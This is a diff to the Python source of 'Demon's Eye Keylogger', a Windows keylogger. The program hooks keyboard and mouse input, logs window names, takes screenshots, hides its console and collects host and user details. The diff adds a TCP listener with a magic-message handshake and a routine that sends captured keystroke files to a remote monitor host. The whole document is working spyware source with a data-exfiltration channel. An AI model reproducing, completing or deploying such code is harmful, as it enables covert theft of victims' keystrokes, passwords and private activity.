@@ -79,33 +79,32 @@ import win32gui
 import winreg
 import wx
 
-
 ########################################################
 # CONSTANTES - CONSTANTS
 ########################################################
-APPNAME = 'Demon\'s Eye Keylogger'      # Just a name
-VERSION = '1.0'                         # Version
-LOGGING_LEVEL = logging.DEBUG           # Log Level Debug. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
-LOG_FILENAME = 'DEKlogger.log'          # Log filename (This is log for program info and debuge, not keys log)
-CRLF = '\n'                             # salto de linea - line feed
-KLGPRE = 'klg_'                         # prefijo nombre ficheros de log - prefix name for log files
-KLGEXT = '.dek'                         # extension nombre ficheros keylogger - extension for keylogger file
-KEYCODE_EXIT = 7                        # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
-SCRPRE = 'scr_'                         # prefijo nombre ficheros captura pantalla - screenshots prefix name
-SCREXT = '.png'                         # extension nombre fichero captura pantalla - screenshots extensuib
+APPNAME = 'Demon\'s Eye Keylogger'  # Just a name
+VERSION = '1.0'  # Version
+LOGGING_LEVEL = logging.DEBUG  # Log Level Debug. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
+LOG_FILENAME = 'DEKlogger.log'  # Log filename (This is log for program info and debuge, not keys log)
+CRLF = '\n'  # salto de linea - line feed
+KLGPRE = 'klg_'  # prefijo nombre ficheros de log - prefix name for log files
+KLGEXT = '.dek'  # extension nombre ficheros keylogger - extension for keylogger file
+KEYCODE_EXIT = 7  # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
+SCRPRE = 'scr_'  # prefijo nombre ficheros captura pantalla - screenshots prefix name
+SCREXT = '.png'  # extension nombre fichero captura pantalla - screenshots extensuib
 
 # Server constants
 SERVER_IP = ''
 SERVER_PORT = 6666
-SERVER_BUFFER_SIZE = 4096
+SERVER_BUFFER_SIZE = 2048
 SERVER_MAX_CLIENTS = 5
+SERVER_ACCEPT_TIMEOUT = 0.3
 MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='
-MAGIC_RESPONSE_PLAIN = APPNAME + VERSION
+DEMONS_EYE_ID = 'D3Y3K3YL0G'  # This ID is for the monitor to recognize the keylogger
+DEFAULT_MONITOR_PORT = 7777  # Monitor Port to send keylogger data
+MONITOR_SOCKET_TIMEOUT = 3  # 3 seconds are more than enough
+MAGIC_RESPONSE = DEMONS_EYE_ID + ' ' + APPNAME + ' ' + VERSION
 ENCODING = 'utf-8'
-
-# Monitor constants
-DEFAULT_MONITOR_PORT = 7777
-
 
 ########################################################
 # VARIABLES GLOBALES - GLOBAL VARIABLES
@@ -129,7 +128,7 @@ key_buffer = ''
 # de keylog supera este tamaño entoces se envia el fichero seguidamente se borra y se crea un nuevo fichero de keylog.
 # File size control (in bytes) that activates to be sent to remote storage when the size of the keylog file exceeds
 # this size, then the file is sent, then it is deleted and a new keylog file is created.
-file_size_trigger = 4096
+file_size_trigger = 1024
 
 # Ruta y nombre archivo keylog. Se asigna el nombre en la función create_keylog_file()
 # Path and file name keylog. The name is assigned in the create_keylog_file () function
@@ -140,15 +139,17 @@ threadLock = threading.Lock()
 threadList = []
 
 # TCP Server control
-server_shutdown = False                 # When the server is killed it is set to True
-server_has_client = False               # Client connected ?
-client_thread = None                    # This is a thread object of Client
-server = None                           # Server object instance
+server_has_client = False  # Client connected ?
+client_thread = None  # This is a thread object of Client
+server = None  # Server object instance
 
 # Send to Monitor control variables
 monitor_enable_send = False
 monitor_ip = None
 monitor_port = DEFAULT_MONITOR_PORT
+
+# Global Mouse and Keyboard Hook
+hm = None
 
 
 ########################################################
@@ -157,7 +158,7 @@ monitor_port = DEFAULT_MONITOR_PORT
 
 # Clase multihilo con metodo que toma captura de pantalla y despues la envia a servicios remotos
 # Threading class to capture screenshot and send to remote services
-class ScreenShootThread (threading.Thread):
+class ScreenShootThread(threading.Thread):
     def __init__(self, screen_filename):
         threading.Thread.__init__(self)
         self.screen_file = screen_filename
@@ -165,14 +166,14 @@ class ScreenShootThread (threading.Thread):
     def run(self):
         msg = 'Guardado captura ' + self.screen_file
         log_verbose(msg, logging.INFO, 1)
-        app = wx.App()                  # Need to create an App instance before doing anything
+        app = wx.App()  # Need to create an App instance before doing anything
         screen = wx.ScreenDC()
         size_x, size_y = screen.GetSize()
         bmp = wx.EmptyBitmap(size_x, size_y, -1)
         mem = wx.MemoryDC(bmp)
         mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
-        del mem                         # libera memoria que contiene captura de imagen
-        del app                         # libera objeto de instancia de la aplicación
+        del mem  # libera memoria que contiene captura de imagen
+        del app  # libera objeto de instancia de la aplicación
         bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
         msg = 'Fin captura ' + self.screen_file
         log_verbose(msg, logging.DEBUG, 2)
@@ -189,10 +190,11 @@ class ClientThread(threading.Thread):
         self.conn = conn
         self.ip = ip
         self.port = port
-        self.response = base64.b64encode(bytes(MAGIC_RESPONSE_PLAIN,ENCODING))
-        # self.response = bytes(MAGIC_RESPONSE_PLAIN,ENCODING)
+        self.response = base64.b64encode(bytes(MAGIC_RESPONSE, ENCODING))
 
     def run(self):
+        global monitor_ip, monitor_port, monitor_enable_send
+
         msg = 'Recibida petición de Monitor desde ' + str(self.ip) + ":" + str(self.port)
         log_verbose(msg, logging.INFO, 1)
 
@@ -201,25 +203,26 @@ class ClientThread(threading.Thread):
         msg = 'Se ha recibido: ' + data
         log_verbose(msg, logging.DEBUG, 2)
         if data == MAGIC_MESSAGE:
-            msg = 'Mensaje correcto. Conexion establecida. Respondiendo {} {}'.format(MAGIC_RESPONSE_PLAIN, self.response)
+            msg = 'Mensaje correcto. Conexion establecida. Respondiendo {} {}'.format(MAGIC_RESPONSE, self.response)
             log_verbose(msg, logging.DEBUG, 2)
             self.conn.sendall(self.response)
             msg = 'Voy a iniciar conexion a {}:{}'.format(self.ip, monitor_port)
             log_verbose(msg, logging.DEBUG, 2)
-            # Inicia comunicación inversa para enviar datos al Monitor
-            # Starts reverse comunication to send data to Monitor
-            # ... pending ...
+            # Establece datos para comunicación inversa al Monitor
+            monitor_ip = self.ip
+            monitor_enable_send = True
         else:
-            msg = 'No tiene permiso'
+            msg = 'No tiene permiso.'
+            monitor_enable_send = False
+            monitor_ip = None
             self.conn.sendall(msg).encode(ENCODING)
             log_verbose(msg, logging.DEBUG, 2)
 
         self.conn.close()
 
 
-
 class ServerListenerThread(threading.Thread):
-    def __init__(self, ip = SERVER_IP, port = SERVER_PORT, buffer_size = SERVER_BUFFER_SIZE):
+    def __init__(self, ip=SERVER_IP, port=SERVER_PORT, buffer_size=SERVER_BUFFER_SIZE):
         threading.Thread.__init__(self)
         self.name = APPNAME
         self.ip = ip
@@ -227,6 +230,10 @@ class ServerListenerThread(threading.Thread):
         self.buffer_size = buffer_size
         self.client_threads = []
         self.server_socket = None
+        self.server_shutdown = False  # When the server is killed it is set to True
+
+    def stop_server(self):
+        self.server_shutdown = True
 
     def run(self):
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -235,21 +242,25 @@ class ServerListenerThread(threading.Thread):
         msg = APPNAME + ' ' + VERSION + ' : Iniciado servidor en ' + str(self.ip) + ' puerto ' + str(self.port)
         log_verbose(msg, logging.INFO, 1)
 
-        while not server_shutdown:
-            self.server_socket.listen(SERVER_MAX_CLIENTS)       # 5 clients are more than enough.
-            msg = 'Esperando conexión del Monitor...'           # Normally there is only 1 monitor.
-            log_verbose(msg, logging.INFO, 1)
+        msg = 'Esperando conexión del Monitor...'  # Normally there is only 1 monitor.
+        log_verbose(msg, logging.INFO, 1)
+        while not self.server_shutdown:
+            self.server_socket.settimeout(SERVER_ACCEPT_TIMEOUT)
+            self.server_socket.listen(SERVER_MAX_CLIENTS)  # 5 clients are more than enough.
+
             try:
                 (conn, (ip, port)) = self.server_socket.accept()
+            except socket.timeout:
+                pass  # ignore timeout, next accept
             except Exception as e:
                 msg = 'Error recibiendo datos de cliente. Excepcion {} '.format(e)
                 log_verbose(msg, logging.ERROR, 2)
-                break                               # Possibly closed server
-
-            # Inicia thread de respuesta - Starts client response thread
-            client = ClientThread(conn, ip, port)
-            client.start()
-            self.client_threads.append(client)
+                break  # Possibly closed server
+            else:
+                # Inicia thread de respuesta - Starts client response thread
+                client = ClientThread(conn, ip, port)
+                client.start()
+                self.client_threads.append(client)
 
         # Make sure the server is turned off.
         try:
@@ -285,16 +296,45 @@ def log_verbose(msg, log_level, verbose_level):
         if verbose >= verbose_level:
             print(msg)
     except Exception as ex:
-        print("Exception %s " % (ex))
+        print("Exception %s " % ex)
+
+
+# Send data to monitor
+def monitor_data_send():
+    global monitor_ip, monitor_port, monitor_enable_send, keylog_name
+    # Can send?
+    if monitor_enable_send and monitor_ip is not None and monitor_port is not None and os.path.getsize(keylog_name) >= file_size_trigger:
+        try:
+            # Open connection to monitor
+            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            soc.settimeout(MONITOR_SOCKET_TIMEOUT)
+            soc.connect((monitor_ip, monitor_port))
+            # Send Data
+            file = open(keylog_name, 'rb')
+            bloc = file.read(SERVER_BUFFER_SIZE)
+            while bloc:
+                soc.send(bloc.encode(ENCODING))
+                bloc = file.read(SERVER_BUFFER_SIZE)
+            file.close()
+            # Close connection
+        except Exception as ex:
+            log_verbose('Error sending data to Monitor. Exception : {}'.format(ex), logging.ERROR, 2)
+        finally:
+            soc.close()
 
 
 # Kill Server and associated clients
 def kill_server_clients():
-    global server, server_shutdown
+    global server
 
-    if not server_shutdown and server is not None:
+    if server is not None:
+        try:
+            server.stop_server()
+        except Exception as e:
+            log_verbose('Error Stopping Server. Exception {}'.format(e), logging.ERROR, 2)
+
         # Kill clients
-        for client in server.clients_threads:
+        for client in server.client_threads:
             try:
                 client.close()
             except Exception as e:
@@ -303,13 +343,12 @@ def kill_server_clients():
         # Kill Server
         try:
             log_verbose('Shutdown server', logging.INFO, 2)
-            server.server_socket.shutdown(socket.SHUT_RDWR)
+            # server.server_socket.shutdown(socket.SHUT_RDWR)
             server.server_socket.close()
         except Exception as e:
             log_verbose('Server already closed', logging.DEBUG, 2)
             log_verbose('Exception {}'.format(e), logging.ERROR, 2)
 
-        server_shutdown = True
         server = None
 
 
@@ -324,7 +363,6 @@ def kill_server_clients():
 #       expire=[minutes]
 #
 def paste_file():
-
     return paste_id
 
 
@@ -355,7 +393,7 @@ def send_email(message):
         server_mail.sendmail(email_from_addr, email_to_addrs, message)
 
     except Exception as ex:
-        msg = 'No he podido enviar mensaje (' + ex + ')'
+        msg = 'No he podido enviar mensaje. Excepcion : {}'.format(ex)
         log_verbose(msg, logging.ERROR, 1)
 
     finally:
@@ -365,7 +403,7 @@ def send_email(message):
 # Oculta la ventana de la aplicación - Hide the application window
 def hide_console():
     window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window,0)
+    win32gui.ShowWindow(window, 0)
     log_verbose('Oculta consola', logging.DEBUG, 3)
 
 
@@ -409,7 +447,8 @@ def register_window_name(text):
 # Register a screenshot, add the name to the keylog file and then start a thread for recording to disk and send
 # it to the external service.
 def capture_screen():
-    global key_buffer
+    global key_buffer, threadList
+
     tmp_folder = tempfile.gettempdir() + '\\'
     screen_file = tmp_folder + SCRPRE + datetime.datetime.now().strftime("%y%m%d%H%M%S") + SCREXT
     key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
@@ -429,25 +468,35 @@ def send_keylog_file():
     Publicar un tweet en cuenta privada con la url del paste
     Opcionalmente hace envio por email para pruebas
     '''
+    # Envia a Monitor
+    monitor_data_send()
+    # Envia a servicio Paste
+
+    # Envia a Twitter
+    pass
     return True
 
 
 # Borra todos los ficheros temporales del keylog - Delete all temporary keylog files
 # Se puede establecer un patron y un mensaje y se reaprovecha para borrar los ficheros de captura de pantalla.
 # A pattern and a message can be set and reused to erase the screenshot files.
-def delete_keylog_tempfile(pattern = None, logmsg = 'Borrado fichero temporal'):
-    if pattern == None:                     # Si no se recibe patron, por defecto borra todos los ficheros de keylog
-        pattern = KLGPRE + '*' + KLGEXT     # If no pattern is received, by default it deletes all keylog files
+def delete_keylog_tempfile(pattern=None, logmsg='Borrado fichero temporal'):
+    if pattern is None:  # Si no se recibe patron, por defecto borra todos los ficheros de keylog
+        pattern = KLGPRE + '*' + KLGEXT  # If no pattern is received, by default it deletes all keylog files
 
     count = 0
     folder_files = tempfile.gettempdir() + '\\' + pattern
     for file_remove in glob.glob(folder_files):
         msg = logmsg + ' : ' + file_remove
         log_verbose(msg, logging.INFO, 3)
-        os.remove(file_remove)
-        count += 1
+        try:
+            os.remove(file_remove)              # Try to remove file
+            count += 1
+        except Exception as e:
+            msg = 'Error borrando archivo {}. Excepcion: {}'.format(file_remove, e)
+            log_verbose(msg, logging.ERROR, 2)
 
-    return count    # Return number of deleted files (if needed)
+    return count  # Return number of deleted files (if needed)
 
 
 # Crea fichero de keylog - Create keylog file
@@ -463,8 +512,8 @@ def create_keylog_file():
     f = open(keylog_name, 'w+')
     f.close()
 
-    key_buffer = ''                     # Nos aseguramos de tener el buffer vacio - Empty buffer
-    register_system_info()              # Guardamos información general del sistema - Save system info
+    key_buffer = ''  # Nos aseguramos de tener el buffer vacio - Empty buffer
+    register_system_info()  # Guardamos información general del sistema - Save system info
     return True
 
 
@@ -534,16 +583,17 @@ def on_mouse_event(event):
     global old_event
 
     # si el usuario cambia de ventana, la registra
-    if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
+    if (old_event is None or event.WindowName != old_event.WindowName) and event.WindowName is not None:
         register_window_name(repr(event.WindowName))
 
     old_event = event
-    return 1            # IMPORTANT. An integer other than 0 must be returned
+    return True     # IMPORTANT. True must be returned
 
 
 # Control eventos de teclado - Keyboard events control
 def on_keyboard_event(event):
-    global key_buffer, key_counter, old_event
+    global key_buffer, key_counter, old_event, server, hm
+    close_app = False
 
     try:
         # Logging and verbose (for debug) of keystrokes and related info
@@ -564,35 +614,50 @@ def on_keyboard_event(event):
         msg = 'Transition: ' + repr(event.Transition)
         log_verbose(msg, logging.DEBUG, 3)
 
+        # Si el usuario cambia de ventana, la registra
+        # If user change active window
+        if (old_event is None or event.WindowName != old_event.WindowName) and event.WindowName is not None:
+            register_window_name(repr(event.WindowName))
+
         # Si presiona combinación especial para salir y desactivar el KeyLogger
         # If especial key to close keylogger is pressed
         if event.Ascii == KEYCODE_EXIT:
             msg = 'Cerrando aplicación por combinación especial de tecla ' + repr(event.Ascii)
             log_verbose(msg, logging.INFO, 2)
             key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
-            sys.exit(0)
-
-        # Si el usuario cambia de ventana, la registra
-        # If user change active window
-        if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
-            register_window_name(repr(event.WindowName))
+            close_app = True
 
         # guarda caracter en el buffer - save key to buffer
         add_key_to_buffer(event)
 
-        # Guarda evento actual para comparar con el siguiente y poder controlar si se mantienen pulsadas teclas especiales
-        # o saber si se cambia de ventana.
+        # Guarda evento actual para comparar con el siguiente y poder controlar si se mantienen pulsadas
+        # teclas especiales o saber si se cambia de ventana.
         # Saves current event info to compare with next one.
         old_event = event
     except Exception as ex:
-        print("Exception %s " % (ex))
+        print("Exception %s " % ex)
 
-    return 1            # IMPORTANT. An integer other than 0 must be returned
+    # Exit control, Disables Hook
+    if close_app:
+        print('close 0')
+        hm.UnhookKeyboard()
+        hm.UnhookMouse()
+        server.stop_server()
+        # kill_server_clients()
+        exit_program()
+
+    return True     # IMPORTANT. True must be returned
 
 
-# Función que ejecutará al cerrar el programa - Whe program is closed
-def on_close_program():
-    global key_buffer, threadList
+# Actions to do before Exit program
+def exit_program():
+    global key_buffer, threadList, server, hm
+    log_verbose('Entering on_close_program', logging.DEBUG, 1)
+
+    print('close 1')
+
+    # ejecuta ultima captura de pantalla antes de cerrar - do a last screenshot
+    capture_screen()
 
     # registra en fichero de log el cerrado del programa con fecha y hora
     # saves to keylog file the Closing Event, Date and Time
@@ -606,11 +671,42 @@ def on_close_program():
     # envia ultimo fichero de log de teclas - send de last keylog capture file
     send_keylog_file()
 
-    # ejecuta captura de pantalla - do a screenshot
+    # espera que finalicen todos los threads que pueda haber activos
+    # wait to all threads are finished
+    for thr in threadList:
+        thr.join()
+
+    # borra ficheros temporales - delete temp files
+    deleted = delete_keylog_tempfile()
+    deleted = delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura pantalla')
+
+    log_verbose('Cerrando', logging.INFO, 2)
+    logging.shutdown()
+
+    sys.exit(0)
+
+
+# Función que ejecutará al cerrar el programa - Whe program is closed
+def on_close_program():
+    global key_buffer, threadList, server, hm
+    log_verbose('Entering on_close_program', logging.DEBUG, 1)
+
+    print('close 1')
+
+    # ejecuta ultima captura de pantalla antes de cerrar - do a last screenshot
     capture_screen()
 
-    # kill server
-    kill_server()
+    # registra en fichero de log el cerrado del programa con fecha y hora
+    # saves to keylog file the Closing Event, Date and Time
+    key_buffer += CRLF + CRLF
+    key_buffer += '[CLOSING PROGRAM]' + CRLF
+    key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF
+
+    # se asegura de vaciar buffer - empty the key buffer to disk
+    flush_key_buffer_to_disk()
+
+    # envia ultimo fichero de log de teclas - send de last keylog capture file
+    send_keylog_file()
 
     # espera que finalicen todos los threads que pueda haber activos
     # wait to all threads are finished
@@ -618,17 +714,20 @@ def on_close_program():
         thr.join()
 
     # borra ficheros temporales - delete temp files
-    delete_keylog_tempfile()
-    delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura pantalla')
+    deleted = delete_keylog_tempfile()
+    deleted = delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura pantalla')
 
     log_verbose('Cerrando', logging.INFO, 2)
     logging.shutdown()
 
+    return True
 
 '''
 Control parametros linea de comando, para instalar, configurar, ajustar.
 NO IMPLEMENTADO TODAVIA
 '''
+
+
 # Parse command line parameters
 def parse_params():
     parser = argparse.ArgumentParser(description=APPNAME + ' ' + VERSION,
@@ -637,14 +736,8 @@ def parse_params():
                         help='Specify -s or --start to start Keylogger')
     parser.add_argument('-v', '--verbose', type=int, choices=[0, 1, 2, 3], default=0,
                         help='Debug verbose to screen. Default value: 0')
-    parser.add_argument('-p', '--ports', type=int, nargs='+',
-                        help='Specify a list of ports to scan. ')
-    parser.add_argument('-m', '--message', type=str, default=MAGIC_MESSAGE,
-                        help='Message to send to host. If empty, -m \'\', then not message is sent. Default value: ' + MAGIC_MESSAGE)
-    parser.add_argument('-t', '--timeout', type=int,
-                        help='Timeout in seconds on port connection.')
-    args = parser.parse_args()
-    return args
+    args_parsed = parser.parse_args()
+    return args_parsed
 
 
 ########################################################
@@ -669,11 +762,11 @@ hostname = socket.gethostname()
 username = getpass.getuser()
 localip = socket.gethostbyname(hostname)
 externalip = get_external_ip()
-execname = sys.argv[0]                              # modo alternativo > execname = os.path.realpath(__file__)
+execname = sys.argv[0]  # modo alternativo > execname = os.path.realpath(__file__)
 extension = os.path.splitext(__file__)[1]
 driveunit = os.path.splitdrive(__file__)[0]
 
-# Se asegura de que el kelogger se inicia en cada arranque del sistema
+# Se asegura de que el keylogger se inicia en cada arranque del sistema
 # Ensures that keylogger starts at system startup
 # add_keylogger_to_startup()
 
@@ -690,6 +783,7 @@ delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura de pantalla anter
 create_keylog_file()
 
 # Crea el objeto hook manager - Creates new hook manager
+# Info: https://www.cs.unc.edu/Research/assist/doc/pyhook/public/pyHook.HookManager.HookManager-class.html
 hm = pyHook.HookManager()
 
 # Registra callbacks de control de eventos - Register event callbacks
@@ -700,14 +794,15 @@ hm.KeyDown = on_keyboard_event
 hm.HookMouse()
 hm.HookKeyboard()
 
-# Registra handler de la función que se ejecutará al terminar la aplicación
-# Handler to do actions when application is closed
-atexit.register(on_close_program)
-
 # Crea Servidor a la escucha de peticiones TCP del Monitor
 # Create server that listens TCP petitions from Monitor
 server = ServerListenerThread(SERVER_IP, SERVER_PORT, SERVER_BUFFER_SIZE)
 server.start()
+# threadList.append(server)
+
+# Registra handler de la función que se ejecutará al terminar la aplicación
+# Handler to do actions when application is closed
+# atexit.register(on_close_program)
 
 # Espera indefinidamente hasta que se produce combinación de salida del keylogger - Wait indefinitely
 pythoncom.PumpMessages()
